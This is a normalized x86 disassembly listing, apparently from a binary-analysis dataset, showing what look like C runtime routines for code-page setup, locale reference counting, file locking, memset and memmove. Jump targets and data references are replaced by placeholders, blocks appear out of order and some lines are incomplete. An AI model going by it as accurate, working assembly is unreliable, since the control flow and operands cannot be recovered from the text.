shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40a876
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_408141
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40890a
mov eax [ ebp - 0x1c ]
sub_408912
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_4038f8
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40895b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_4089b7
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40393d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40393d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_408a88
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_407a6d
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_408ac9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_407a6d
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_408afb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_407994
pop ecx
pop ebp
retn
sub_408b37
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_407994
pop ecx
pop ebp
retn
sub_408b66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
pop ebp
retn
sub_408b8c
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_408bbb
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_409820
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_408c1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40aeee
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40adc1
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40adc1
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_409820
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_408daf
push 0xc
push r--data
call sub_403d50
call sub_406746
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408e4a
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_403d95
retn
push 0x20
call sub_403d29
cmp esi rw-data
je r-xdata
push esi
call sub_405311
pop ecx
sub_408e53
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_404172
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_408ecf
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_408e53
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_408bbb
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_409820
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_408b8c
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_408c1f
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_409820
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_408b8c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4090b8
push 0x14
push r--data
call sub_403d50
or [ ebp - 0x20 ] 0xffffffff
call sub_406746
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_408daf
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_408e53
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_4038f8
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_403d95
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_408ecf
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405072
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_405311
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_405311
pop ecx
push 0xd
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409219
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_405311
pop ecx
sub_409270
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4092ff
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_409398
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_405311
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_405311
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_405311
push [ esi + 0xc0 ]
call sub_405311
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40af2e
push [ esi + 0xd4 ]
call sub_405311
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_405311
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_405311
pop ecx
push [ esi + 0xb0 ]
call sub_405311
push [ esi + 0xbc ]
call sub_405311
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_405311
push [ esi + 0xbc ]
call sub_40b30e
pop ecx
pop ecx
push eax
call sub_405311
pop ecx
push eax
call sub_405311
push [ esi + 0xbc ]
call sub_40b2a5
pop ecx
pop ecx
sub_4094e3
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_409270
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_4092ff
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_409398
pop ecx
sub_409530
push 0xc
push r--data
call sub_403d50
call sub_406746
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_4094e3
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40959d
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_406746
mov esi [ eax + 0x6c ]
mov eax esi
call sub_403d95
retn
push 0x20
call sub_403d29
sub_4095bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_404172
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405072
push 0x16
pop esi
mov [ eax ] esi
call sub_405020
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_405072
mov [ eax ] 0x2a
call sub_405072
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_405072
push 0x22
pop esi
mov [ eax ] esi
call sub_405020
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_409820
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_409820
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_409731
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404172
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_409780
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_409820
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40b40c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40989a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_404172
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_409731
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40aeee
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_409960
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_409994
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405072
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405072
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_405020
mov eax esi
jmp r-xdata
sub_409a00
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
